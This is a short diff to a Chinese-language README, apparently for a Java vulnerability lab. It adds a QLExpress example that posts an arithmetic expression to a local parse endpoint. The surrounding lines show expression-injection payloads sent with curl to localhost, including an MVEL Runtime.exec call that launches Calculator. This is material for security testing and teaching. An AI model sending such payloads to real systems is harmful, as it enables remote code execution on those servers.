@@ -120,6 +120,12 @@ curl 127.0.0.1:8080/spel/parse -d 'expression=T(java.lang.System).setProperty("c
 curl 127.0.0.1:8080/mvel/parse -d 'expression=Runtime.getRuntime().exec("open /System/Applications/Calculator.app")'
 ```
 
+#### QLExpress
+
+```bash
+curl 127.0.0.1:8080/qlexpress/parse -d 'expression=555-333'
+```
+
 ### 反序列化
 
 #### JDBC
